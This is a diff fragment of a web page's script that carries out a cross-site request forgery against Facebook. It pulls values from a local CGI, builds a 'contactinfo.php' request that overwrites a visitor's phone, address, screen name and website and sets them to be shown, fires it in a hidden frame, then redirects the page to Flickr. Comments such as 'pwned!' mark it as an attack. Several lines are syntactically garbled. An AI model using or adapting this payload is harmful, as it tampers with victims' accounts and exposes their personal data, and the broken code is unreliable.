@@ -1,0 +1,34 @@
+function f2() {
+// load the facebook values... cross-site security? what's that?
+window.frames['script'location="/cgi-bin/script.cgi";
+}
+function f3() {
+// wait for the cgi to respond
+try { test = window.frames['script'].document.forms[0].website.value; } catch (e) { setTimeout('f3();',1500); return; }
+// populate the new request
+f = window.frames[script'].document.forms[0];
+request_string = "http://" + encodeURIComponent(f.school.value) +
+".facebook.com/contactinfo.php?&save_contact_info=1&contact=" +
+encodeURIComponent(f.contact.value) + "&sn=" +
+encodeURIComponent(f.sn.value) + "&cell=" +
+encodeURIComponent(f.cell.value) + "&phone=" +
+encodeURIComponent(f.phone.value) + "&mailbox=" +
+encodeURIComponent(f.mailbox.value) + "&cur_address=" +
+encodeURIComponent(f.cur_address.value) + "&website=" +
+encodeURIComponent(f.website.value) +
+"&show_email=8&show_aim=26&show_cell=26&show_phone=26&show_mailbox=26&show_address=26&save=Save";
+// pwned!
+//window.frames['script'].document.write(request_string);
+window.frames[.face'].location=request_string;
+setTimeout('f4()', 3000);
+}
+function f4() {
+// bust some frames
+top.location.href = "http://www.flickr.com/photos/tags/party/show/";
+}
+// byebye
+-->
+</script>
+</body>
+</html>
+
